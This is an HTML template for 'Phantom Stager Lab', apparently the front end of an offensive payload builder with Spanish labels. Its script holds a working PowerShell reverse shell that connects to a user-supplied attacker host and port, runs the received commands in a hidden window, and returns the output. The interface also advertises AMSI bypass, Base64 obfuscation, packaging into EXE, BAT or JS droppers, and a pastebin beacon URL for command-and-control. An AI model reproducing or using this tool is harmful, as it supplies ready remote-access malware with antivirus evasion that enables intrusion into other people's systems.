<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <link rel="icon" href="{{ url_for('static', filename='favicon.ico') }}">
    <title>Phantom Stager Lab</title>
    <style>
        :root {
            --primary: #00d4ff; --accent: #ff0055; --bg: #020202;
            --panel: rgba(10, 15, 25, 0.98); --border: #004466;
            --led-on: #39ff14; --glow: 0 0 20px rgba(0, 212, 255, 0.4);
        }
        * { box-sizing: border-box; }
        body, html { height: 100vh; margin: 0; padding: 0; background-color: var(--bg); color: var(--primary); font-family: 'Courier New', monospace; overflow: hidden; }
        body { background-image: linear-gradient(var(--border) 1px, transparent 1px), linear-gradient(90deg, var(--border) 1px, transparent 1px); background-size: 50px 50px; }
        .dashboard { display: grid; grid-template-columns: 300px 1fr 300px; grid-template-rows: 70px 1fr 180px; height: 100vh; gap: 12px; padding: 12px; }
        .panel { background: var(--panel); border: 1px solid var(--border); padding: 15px; display: flex; flex-direction: column; box-shadow: inset 0 0 25px rgba(0,0,0,1), var(--glow); }
        header { grid-column: 1 / 4; flex-direction: row !important; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--primary); }
        .main-engine { grid-column: 2; grid-row: 2; border: 1px solid var(--primary); }
        .compiler-container { display: grid; grid-template-columns: 1fr 280px; gap: 20px; flex-grow: 1; overflow: hidden; }
        .sidebar { grid-row: 2 / 4; justify-content: space-between; }
        h2 { font-size: 1.1rem; margin: 0 0 10px 0; text-transform: uppercase; border-left: 4px solid var(--primary); padding-left: 10px; }
        label { display: block; font-size: 0.75rem; margin-bottom: 5px; opacity: 0.8; text-transform: uppercase; }
        textarea, input, select { width: 100%; background: #000; border: 1px solid var(--border); color: var(--primary); padding: 10px; outline: none; font-family: inherit; margin-bottom: 10px; }
        button { width: 100%; padding: 15px; background: var(--primary); color: #000; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; box-shadow: 0 0 15px var(--primary); transition: 0.3s; }
        button:hover { background: #fff; box-shadow: 0 0 30px var(--primary); }
        .gen-tool { border-left: 1px solid var(--border); padding-left: 20px; background: rgba(0,0,0,0.2); }
        .btn-gen { background: transparent; color: var(--primary); border: 1px solid var(--primary); padding: 8px; font-size: 0.75rem; margin-top: 5px; box-shadow: none; }
        .btn-gen:hover { background: var(--primary); color: #000; }
        .led { width: 10px; height: 10px; border-radius: 50%; background: #222; transition: 0.3s; flex-shrink: 0; }
        .led.active { background: var(--led-on); box-shadow: 0 0 15px var(--led-on); }
        .disabled-input { opacity: 0.2; pointer-events: none; }
        .scene { width: 180px; height: 180px; perspective: 1000px; margin: 0 auto; display: flex; justify-content: center; align-items: center; }
        .carousel { width: 100%; height: 100%; position: relative; transform-style: preserve-3d; animation: rotateCarousel 12s linear infinite; }
        .carousel div { position: absolute; width: 160px; height: 160px; background: url('https://i.ibb.co/8DBfmSkZ/modelo.png') center/cover no-repeat; border: none; backface-visibility: visible; }
        .face-1 { transform: rotateY(0deg) translateZ(80px); }
        .face-2 { transform: rotateY(90deg) translateZ(80px); }
        .face-3 { transform: rotateY(180deg) translateZ(80px); }
        .face-4 { transform: rotateY(270deg) translateZ(80px); }
        @keyframes rotateCarousel { from { transform: rotateY(0deg); } to { transform: rotateY(360deg); } }
        #live-dot {
    background: #00ff00;
    box-shadow: 0 0 10px #00ff00;
    animation: blink 1s infinite;
	}
	@keyframes blink {
    	0%,100% {opacity:1;}
    	50% {opacity:0.3;}
	}
    </style>
</head>
<body>
<div class="dashboard">
    <header class="panel">
        <div>ID: <span style="color:#fff">kr1pt0n_OffSec</span></div>
        <div style="font-size: 1.4rem; font-weight: bold; letter-spacing: 8px;">PHANTOM STAGER</div>
        <div style="color:var(--accent); animation: blink 1.5s infinite;">STATUS: ACTIVE</div>
    </header>

    <aside class="panel sidebar">
        <div>
            <h2>RT_CHECKLIST</h2>
            <div class="checklist">
                <li style="display:flex; align-items:center; gap:10px; margin-bottom:12px; list-style:none;"><div id="check-1" class="led"></div> PAYLOAD_ANALYSIS</li>
                <li style="display:flex; align-items:center; gap:10px; margin-bottom:12px; list-style:none;"><div id="check-2" class="led"></div> AMSI_PATCH_v5</li>
                <li style="display:flex; align-items:center; gap:10px; margin-bottom:12px; list-style:none;"><div id="check-3" class="led"></div> B64_OBFUSCATION</li>
                <li style="display:flex; align-items:center; gap:10px; margin-bottom:12px; list-style:none;"><div id="check-4" class="led"></div> EXE_COMPILATION</li>
            </div>
        </div>
        <!-- ===== PANEL RECON ===== -->
<div style="margin-top:20px;">

    <!-- HEADER -->
    <div style="display:flex; align-items:center; gap:10px; margin-bottom:10px;">
        <span style="color:#666;">[ RECON ]</span>
        <div id="live-dot" class="led active"></div>
        <span style="color:#00ff88;">LIVE</span>
    </div>

    <!-- BOX -->
    <div style="
        border:1px solid #00eaff;
        padding:12px;
        font-size:13px;
        line-height:1.6;
    ">

        <div style="display:flex; justify-content:space-between;">
            <span>IP</span>
            <span id="ip">-</span>
        </div>

        <div style="display:flex; justify-content:space-between;">
            <span>PORT</span>
            <span id="port">-</span>
        </div>

        <div style="display:flex; justify-content:space-between;">
            <span>OS</span>
            <span id="os">-</span>
        </div>

        <div style="display:flex; justify-content:space-between;">
            <span>TIME</span>
            <span id="time">-</span>
        </div>

        <div style="display:flex; justify-content:space-between;">
            <span>CPU</span>
            <span id="cpu">-</span>
        </div>

        <div style="display:flex; justify-content:space-between;">
            <span>RAM</span>
            <span id="ram">-</span>
        </div>

    </div>

</div>
        <div class="scene"><div class="carousel"><div class="face-1"></div><div class="face-2"></div><div class="face-3"></div><div class="face-4"></div></div></div>
    </aside>

    <main class="panel main-engine">
        <h2>CORE_COMPILER</h2>
        <form action="/generate" method="POST" style="flex-grow:1; display:flex; flex-direction:column;">
            <div class="compiler-container">
                <div style="display:flex; flex-direction:column;">
                    <label>SOURCE PAYLOAD (POWERSHELL RAW):</label>
                    <textarea id="ps_code" name="ps_code" style="flex-grow:1;" placeholder="Pega tu código aquí..."></textarea>
                </div>
                <div class="gen-tool">
                    <label style="color:var(--primary);">🛠️ GENERADOR_PAYLOADS_POWERSHELL</label>
                    <label>LHOST:</label><input type="text" id="v_host" value="192.168.1.42">
                    <label>LPORT:</label><input type="text" id="v_port" value="4443">
                    <button type="button" class="btn-gen" onclick="injectCustom()">Inyectar</button>
                </div>
            </div>
            <div style="display: flex; gap: 15px; margin-top:15px;">
                <div style="flex: 1;"><label>CONN_MODE:</label><select name="conn_mode" onchange="toggleFaro(this.value)"><option value="static">ESTÁTICA</option><option value="dynamic">DINÁMICA</option></select></div>
                <div style="flex: 2;" id="faro_box" class="disabled-input"><label>FARO_URL:</label><input type="text" name="nurl" placeholder="https://pastebin.com"></div>
            </div>
            <div style="display: flex; gap: 15px;">
                <div style="flex: 1;"><label>OUTPUT_FORMAT:</label>
                    <select name="format">
                        <option value="exe">EXECUTABLE (.EXE)</option>
                        <option value="bat">BATCH (.BAT)</option>
                        <option value="js">JSCRIPT (.JS)</option>
                    </select>
                </div>
                <div style="flex: 1; display: flex; align-items: flex-end;"><button type="button" onclick="startCompilation()">COMPILAR</button></div>
            </div>
        </form>
    </main>

    <aside class="panel sidebar" style="box-shadow: 0 0 20px var(--primary);">
        <h2>NOTAS</h2>
        <textarea style="flex-grow:1; border:none; background:transparent; color:#fff;" placeholder="Notas..."></textarea>
    </aside>

    <footer class="panel" style="grid-column: 2;"><h2>CONSOLE_OUTPUT</h2><div id="log-container" style="overflow-y:auto; flex-grow:1; font-size:0.8rem;"></div></footer>
</div>

<script>
    function toggleFaro(v) { document.getElementById('faro_box').className = (v === 'dynamic') ? "" : "disabled-input"; }
    
    function injectCustom() {
        var h = document.getElementById('v_host').value;
        var p = document.getElementById('v_port').value;
        var payload = "Start-Process $PSHOME\\powershell.exe -ArgumentList {$client = New-Object System.Net.Sockets.TCPClient('" + h + "'," + p + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()} -WindowStyle Hidden";
        document.getElementById('ps_code').value = payload;
    }

    async function addLog(t, d, l = null) { return new Promise(r => { setTimeout(() => { const dv = document.createElement('div'); dv.style.marginBottom="4px"; dv.innerText = `[${new Date().toLocaleTimeString()}] ${t}`; document.getElementById('log-container').prepend(dv); if(l) document.getElementById(l).classList.add('active'); r(); }, d); }); }
    
    async function startCompilation() {
        if(!document.getElementById('ps_code').value) return alert("Buffer vacío.");
        document.getElementById('log-container').innerHTML = ''; document.querySelectorAll('.led').forEach(l => l.classList.remove('active'));
        await addLog("🚀 Iniciando motor V5...", 300); 
        await addLog("🔍 Analizando stager...", 500, "check-1"); 
        await addLog("💉 Parcheando AMSI...", 600, "check-2");
        await addLog("🔐 Ofuscando B64...", 500, "check-3"); 
        await addLog("🛠️ Compilando Binario EXE (C#)...", 1200, "check-4"); 
        setTimeout(() => { document.querySelector('form').submit(); }, 500);
    }
    async function loadSystemInfo() {
    try {
        const res = await fetch("/api/info");
        const data = await res.json();

        document.getElementById("ip").textContent = data.ip;
        document.getElementById("port").textContent = data.port;
        document.getElementById("os").textContent = data.os;
        document.getElementById("time").textContent = data.time;
        document.getElementById("cpu").textContent = data.cpu + "%";
        document.getElementById("ram").textContent = data.ram + "%";

    } catch (e) {
        console.log("error api");
    }
}

setInterval(loadSystemInfo, 2000);
loadSystemInfo();
</script>
</body>
</html>
